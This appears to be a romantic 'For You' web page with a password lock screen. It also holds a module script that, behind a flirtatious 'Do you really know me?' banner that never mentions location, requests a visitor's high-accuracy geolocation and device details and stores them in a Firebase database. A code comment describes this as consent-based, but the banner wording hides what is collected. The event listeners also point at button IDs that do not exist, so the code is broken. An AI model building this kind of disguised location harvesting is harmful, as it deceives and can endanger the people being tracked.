<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>For You 🌹</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,600;1,400;1,600&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

    :root {
      --rose:      #e8436a;
      --rose-soft: #f9a8be;
      --blush:     #ffe4ec;
      --ink:       #0d0811;
      --ink-mid:   #1c1220;
      --ink-light: #2e1f2e;
      --petal:     #ffdde8;
      --gold:      #e8c87d;
      --text-main: #f7e9ef;
      --text-sub:  #c9a8b8;
    }

    html, body {
      height: 100%;
      font-family: 'DM Sans', sans-serif;
      background: var(--ink);
      color: var(--text-main);
      overflow: hidden;
    }

    /* ── Canvas background ── */
    #canvas-bg {
      position: fixed;
      inset: 0;
      z-index: 0;
    }

    /* ── Vignette ── */
    .vignette {
      position: fixed;
      inset: 0;
      z-index: 1;
      background: radial-gradient(ellipse at center, transparent 40%, rgba(0,0,0,0.72) 100%);
      pointer-events: none;
    }

    /* ── Wrapper ── */
    .scene {
      position: relative;
      z-index: 10;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
    }

    /* ── LOCK SCREEN ── */
    .lock-screen {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 28px;
      animation: fadeUp 0.9s ease both;
    }

    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(24px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    .lock-icon {
      font-size: 3rem;
      animation: float 3s ease-in-out infinite;
    }
    @keyframes float {
      0%,100% { transform: translateY(0); }
      50%      { transform: translateY(-10px); }
    }

    .lock-heading {
      font-family: 'Cormorant Garamond', serif;
      font-size: clamp(1.9rem, 5vw, 2.8rem);
      font-style: italic;
      color: var(--text-main);
      text-align: center;
      line-height: 1.25;
      letter-spacing: 0.01em;
    }

    .lock-sub {
      font-size: 0.92rem;
      color: var(--text-sub);
      text-align: center;
      line-height: 1.7;
      max-width: 300px;
    }

    .input-wrap {
      position: relative;
      width: 100%;
      max-width: 320px;
    }

    .password-input {
      width: 100%;
      background: rgba(255,255,255,0.06);
      border: 1.5px solid rgba(232, 67, 106, 0.35);
      border-radius: 12px;
      padding: 14px 50px 14px 18px;
      font-family: 'DM Sans', sans-serif;
      font-size: 1rem;
      color: var(--text-main);
      outline: none;
      transition: border-color 0.25s, box-shadow 0.25s;
      letter-spacing: 0.08em;
    }
    .password-input::placeholder { color: rgba(201,168,184,0.5); letter-spacing: 0.02em; }
    .password-input:focus {
      border-color: var(--rose);
      box-shadow: 0 0 0 3px rgba(232,67,106,0.18);
    }
    .password-input.shake {
      animation: shake 0.45s ease;
      border-color: #ff3f6c;
    }
    @keyframes shake {
      0%,100% { transform: translateX(0); }
      20%      { transform: translateX(-8px); }
      40%      { transform: translateX(8px); }
      60%      { transform: translateX(-6px); }
      80%      { transform: translateX(6px); }
    }

    .toggle-eye {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      font-size: 1.1rem;
      color: var(--text-sub);
      line-height: 1;
    }

    .submit-btn {
      width: 100%;
      max-width: 320px;
      padding: 14px;
      background: linear-gradient(135deg, #c42d54 0%, var(--rose) 60%, #f06882 100%);
      border: none;
      border-radius: 12px;
      color: #fff;
      font-family: 'DM Sans', sans-serif;
      font-size: 1rem;
      font-weight: 500;
      letter-spacing: 0.04em;
      cursor: pointer;
      transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
      box-shadow: 0 6px 24px rgba(232,67,106,0.35);
    }
    .submit-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 32px rgba(232,67,106,0.5);
    }
    .submit-btn:active { transform: translateY(0); opacity: 0.85; }

    .attempts-bar {
      display: flex;
      gap: 8px;
      justify-content: center;
    }
    .dot {
      width: 10px; height: 10px;
      border-radius: 50%;
      background: var(--rose);
      transition: background 0.3s, transform 0.3s;
    }
    .dot.lost {
      background: rgba(255,255,255,0.15);
      transform: scale(0.75);
    }

    .hint-text {
      font-size: 0.8rem;
      color: var(--text-sub);
      text-align: center;
      opacity: 0.65;
      font-style: italic;
    }

    /* ── DENIED SCREEN ── */
    .denied-screen {
      display: none;
      flex-direction: column;
      align-items: center;
      gap: 22px;
      text-align: center;
      animation: fadeUp 0.7s ease both;
    }
    .denied-screen .big-emoji { font-size: 4rem; }
    .denied-screen h2 {
      font-family: 'Cormorant Garamond', serif;
      font-size: 2rem;
      font-style: italic;
      color: var(--rose-soft);
    }
    .denied-screen p { color: var(--text-sub); font-size: 0.95rem; line-height: 1.7; max-width: 280px; }
    .denied-screen .try-again-btn {
      padding: 12px 32px;
      background: transparent;
      border: 1.5px solid var(--rose);
      border-radius: 10px;
      color: var(--rose-soft);
      font-family: 'DM Sans', sans-serif;
      font-size: 0.95rem;
      cursor: pointer;
      transition: background 0.2s, color 0.2s;
    }
    .denied-screen .try-again-btn:hover {
      background: rgba(232,67,106,0.12);
    }

    /* ── Floating petals ── */
    .petal-layer {
      position: fixed;
      inset: 0;
      z-index: 3;
      pointer-events: none;
      overflow: hidden;
    }
    .petal {
      position: absolute;
      top: -60px;
      font-size: 1.1rem;
      opacity: 0.55;
      animation: petalFall linear infinite;
      user-select: none;
    }
    @keyframes petalFall {
      0%   { transform: translateY(0) rotate(0deg) translateX(0); opacity: 0.6; }
      50%  { transform: translateY(50vh) rotate(180deg) translateX(30px); }
      100% { transform: translateY(110vh) rotate(360deg) translateX(-20px); opacity: 0; }
    }

    /* ── Consent banner ── */
    .consent-banner {
      position: fixed;
      left: 50%;
      bottom: 24px;
      transform: translateX(-50%) translateY(140%);
      z-index: 100;
      width: min(92vw, 420px);
      background: rgba(28, 18, 32, 0.96);
      border: 1.5px solid rgba(232,67,106,0.35);
      border-radius: 16px;
      padding: 18px 20px;
      box-shadow: 0 12px 40px rgba(0,0,0,0.45);
      backdrop-filter: blur(6px);
      transition: transform 0.5s cubic-bezier(.2,.9,.3,1);
    }
    .consent-banner.show { transform: translateX(-50%) translateY(0); }
    .consent-text {
      font-size: 0.88rem;
      color: var(--text-main);
      line-height: 1.55;
      margin-bottom: 14px;
    }
    .consent-text b { color: var(--rose-soft); }
    .consent-actions { display: flex; gap: 10px; }
    .consent-btn {
      flex: 1;
      padding: 10px 12px;
      border-radius: 10px;
      font-family: 'DM Sans', sans-serif;
      font-size: 0.85rem;
      cursor: pointer;
      transition: transform 0.15s, opacity 0.15s;
    }
    .consent-btn:active { transform: scale(0.97); }
    .consent-btn.share {
      border: none;
      background: linear-gradient(135deg, #c42d54 0%, var(--rose) 60%, #f06882 100%);
      color: #fff;
    }
    .consent-btn.decline {
      background: transparent;
      border: 1.5px solid rgba(255,255,255,0.18);
      color: var(--text-sub);
    }
    .consent-toast {
      position: fixed;
      left: 50%;
      bottom: 24px;
      transform: translateX(-50%) translateY(140%);
      z-index: 100;
      background: rgba(28,18,32,0.96);
      border: 1.5px solid rgba(232,67,106,0.3);
      color: var(--text-main);
      padding: 12px 18px;
      border-radius: 12px;
      font-size: 0.85rem;
      transition: transform 0.4s ease;
    }
    .consent-toast.show { transform: translateX(-50%) translateY(0); }
  </style>
</head>
<body>

<canvas id="canvas-bg"></canvas>
<div class="vignette"></div>
<div class="petal-layer" id="petal-layer"></div>

<div class="scene">

  <!-- Lock screen -->
  <div class="lock-screen" id="lock-screen">
    <div class="lock-icon">💌</div>
    <h1 class="lock-heading">Hey, do I know you?&nbsp;🥺</h1>
    <p class="lock-sub">
      If I know you <br>
       you should know the password 🐨🐨.
    </p>

    <div class="input-wrap">
      <input
        id="pwd-input"
        class="password-input"
        type="password"
        placeholder="whisper it here…"
        autocomplete="off"
        spellcheck="false"
        maxlength="60"
      />
      <button class="toggle-eye" id="eye-btn" onclick="toggleEye()" title="Show/hide">👁</button>
    </div>

    <button class="submit-btn" onclick="checkPassword()">💕 Enter</button>

    <div class="attempts-bar" id="dots">
      <div class="dot" id="d1"></div>
      <div class="dot" id="d2"></div>
      <div class="dot" id="d3"></div>
    </div>
    <p class="hint-text" id="hint-text">3 chances remaining</p>
  </div>

  <!-- Denied screen -->
  <div class="denied-screen" id="denied-screen">
    <div class="big-emoji">💔</div>
    <h2>Access Denied</h2>
    <p>You don't know the password...<br>This page is not for you. 🥺</p>
    <button class="try-again-btn" onclick="resetLock()">Okay fine... 🥺</button>
  </div>

</div>

<!-- Consent banner: location is only requested/stored if the visitor taps "Share" -->
<div class="consent-banner" id="consent-banner">
  <p class="consent-text">Do you really know me? </p>
  <div class="consent-actions">
    <button class="consent-btn trigger-yes" id="btn-no">No</button>
    <button class="consent-btn trigger-yes" id="btn-yes">yes 💕</button>
  </div>
</div>
<div class="consent-toast" id="consent-toast"></div>

<script>
  /* ──────────────────────────────────────────
     CANVAS: animated aurora / rose nebula bg
  ────────────────────────────────────────── */
  const canvas = document.getElementById('canvas-bg');
  const ctx    = canvas.getContext('2d');
  let W, H, t = 0;

  function resize() {
    W = canvas.width  = window.innerWidth;
    H = canvas.height = window.innerHeight;
  }
  resize();
  window.addEventListener('resize', resize);

  function drawBg() {
    ctx.fillStyle = '#0d0811';
    ctx.fillRect(0, 0, W, H);

    const orbs = [
      { x: W*0.2, y: H*0.3, r: W*0.45, c1: 'rgba(140,20,60,0.35)', c2: 'transparent', ox: 0.18, oy: 0.12 },
      { x: W*0.8, y: H*0.7, r: W*0.4,  c1: 'rgba(90,0,80,0.3)',   c2: 'transparent', ox:-0.14, oy:-0.1 },
      { x: W*0.5, y: H*0.5, r: W*0.35, c1: 'rgba(200,50,90,0.18)', c2: 'transparent', ox: 0.1,  oy: 0.18 },
    ];

    orbs.forEach(o => {
      const x = o.x + Math.sin(t * o.ox) * W * 0.07;
      const y = o.y + Math.cos(t * o.oy) * H * 0.07;
      const g = ctx.createRadialGradient(x, y, 0, x, y, o.r);
      g.addColorStop(0, o.c1);
      g.addColorStop(1, o.c2);
      ctx.fillStyle = g;
      ctx.fillRect(0, 0, W, H);
    });

    // Subtle star field
    if (t % 1 < 0.016) {
      const stars = [];
      for (let i = 0; i < 80; i++) {
        stars.push({ x: Math.random()*W, y: Math.random()*H, r: Math.random()*1.2 });
      }
      canvas._stars = stars;
    }
    if (canvas._stars) {
      canvas._stars.forEach(s => {
        ctx.beginPath();
        ctx.arc(s.x, s.y, s.r, 0, Math.PI*2);
        ctx.fillStyle = `rgba(255,220,235,${0.15 + Math.abs(Math.sin(t*0.5 + s.x))*0.25})`;
        ctx.fill();
      });
    }

    t += 0.008;
    requestAnimationFrame(drawBg);
  }
  drawBg();

  /* ────────── Floating petals ────────── */
  (function spawnPetals() {
    const layer  = document.getElementById('petal-layer');
    const glyphs = ['🌸','🌺','🌹','💮','✿','❀','🍃'];
    setInterval(() => {
      const el = document.createElement('span');
      el.className = 'petal';
      el.textContent = glyphs[Math.floor(Math.random() * glyphs.length)];
      el.style.left   = Math.random() * 100 + 'vw';
      el.style.fontSize = (10 + Math.random() * 14) + 'px';
      const dur = 7 + Math.random() * 8;
      el.style.animationDuration  = dur + 's';
      el.style.animationDelay     = Math.random() * 3 + 's';
      el.style.opacity = 0.3 + Math.random() * 0.35;
      layer.appendChild(el);
      setTimeout(() => el.remove(), (dur + 4) * 1000);
    }, 700);
  })();

  /* ────────── Password logic ────────── */
  const ANSWERS   = ['koala'];
  let   attemptsLeft = 3;
  let   eyeOpen      = false;

  function toggleEye() {
    eyeOpen = !eyeOpen;
    const inp = document.getElementById('pwd-input');
    inp.type  = eyeOpen ? 'text' : 'password';
    document.getElementById('eye-btn').textContent = eyeOpen ? '🙈' : '👁';
  }

  document.getElementById('pwd-input').addEventListener('keydown', e => {
    if (e.key === 'Enter') checkPassword();
  });

  function checkPassword() {
    const val = document.getElementById('pwd-input').value.trim().toLowerCase();
    if (ANSWERS.includes(val)) {
      // Correct!
      document.getElementById('pwd-input').style.borderColor = '#5cdb8f';
      setTimeout(() => { window.location.href = 'yes.html'; }, 600);
      return;
    }
    // Wrong
    attemptsLeft--;
    const inp = document.getElementById('pwd-input');
    inp.classList.remove('shake');
    void inp.offsetWidth;
    inp.classList.add('shake');
    inp.value = '';

    const dotEl = document.getElementById('d' + (4 - attemptsLeft - (3 - attemptsLeft)));
    // Update dots
    document.querySelectorAll('.dot').forEach((d,i) => {
      if (i >= attemptsLeft) d.classList.add('lost');
    });

    const hint = document.getElementById('hint-text');
    if (attemptsLeft <= 0) {
      hint.textContent = 'No chances left 💔';
      setTimeout(showDenied, 800);
    } else {
      hint.textContent = attemptsLeft + (attemptsLeft === 1 ? ' chance remaining' : ' chances remaining');
    }
  }

  function showDenied() {
    document.getElementById('lock-screen').style.display  = 'none';
    document.getElementById('denied-screen').style.display = 'flex';
  }

  function resetLock() {
    attemptsLeft = 3;
    document.querySelectorAll('.dot').forEach(d => d.classList.remove('lost'));
    document.getElementById('hint-text').textContent = '3 chances remaining';
    document.getElementById('pwd-input').value = '';
    document.getElementById('denied-screen').style.display = 'none';
    document.getElementById('lock-screen').style.display   = 'flex';
  }
</script>

<script type="module">
  /* ── Firebase (same project used for messages in yes.html) ── */
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
  import { getFirestore, collection, addDoc, serverTimestamp }
    from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

  const firebaseConfig = {
    apiKey: "AIzaSyCvi2aSdkckODXzkzuDqg3YpfKlupt5Gug",
    authDomain: "panda-30d7f.firebaseapp.com",
    projectId: "panda-30d7f",
    storageBucket: "panda-30d7f.firebasestorage.app",
    messagingSenderId: "316320865260",
    appId: "1:316320865260:web:b56189edff9536299efec9"
  };
  const app = initializeApp(firebaseConfig);
  const db  = getFirestore(app);
  const visitsCol = collection(db, 'visits');

  const banner = document.getElementById('consent-banner');
  const toastEl = document.getElementById('consent-toast');

  function showToast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add('show');
    setTimeout(() => toastEl.classList.remove('show'), 2600);
  }

  function hideBanner() {
    banner.classList.remove('show');
  }

  // Only show once per browser session so it's not annoying on repeat visits/reloads
  if (!localStorage.getItem('consentAsked')) {
    setTimeout(() => banner.classList.add('show'), 1200);
  }
  localStorage.setItem('consentAsked', '1');

  document.getElementById('consent-decline').addEventListener('click', () => {
    hideBanner();
  });

  document.getElementById('consent-share').addEventListener('click', () => {
    if (!('geolocation' in navigator)) {
      showToast("😢");
      hideBanner();
      return;
    }
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        hideBanner();
        try {
          await addDoc(visitsCol, {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracyMeters: pos.coords.accuracy,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            ts: serverTimestamp()
          });
          showToast('💕');
        } catch (e) {
          showToast('😢');
        }
      },
      () => {
        // Permission denied or unavailable — store nothing
        hideBanner();
        showToast('No worries ');
      },
      { enableHighAccuracy: true, timeout: 8000 }
    );
  });
  

</script>
</body>
</html>
